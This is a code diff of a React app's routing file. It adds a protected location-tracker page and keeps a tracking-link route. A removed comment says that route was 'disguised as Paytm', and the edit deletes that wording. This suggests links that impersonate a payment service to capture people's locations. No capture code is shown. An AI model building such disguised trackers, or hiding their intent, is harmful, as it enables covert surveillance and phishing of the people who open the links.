@@ -11,16 +11,27 @@ import Dashboard from "./pages/Dashboard";
 import About from "./pages/About";
 import Contact from "./pages/Contact";
 import TrackingCapture from "./pages/TrackingCapture";
+import LocationTracker from "./components/LocationTracker";
 
 export default function App() {
   return (
     <Router>
       <AuthProvider>
         <Routes>
-          {/* Tracking link route - no navbar, disguised as Paytm */}
+          {/* Tracking link — no navbar */}
           <Route path="/t/:token" element={<TrackingCapture />} />
 
-          {/* All other routes with Navbar */}
+          {/* Location page — full-screen, no navbar */}
+          <Route
+            path="/location"
+            element={
+              <ProtectedRoute>
+                <LocationTracker />
+              </ProtectedRoute>
+            }
+          />
+
+          {/* All other routes — with Navbar */}
           <Route
             path="*"
             element={
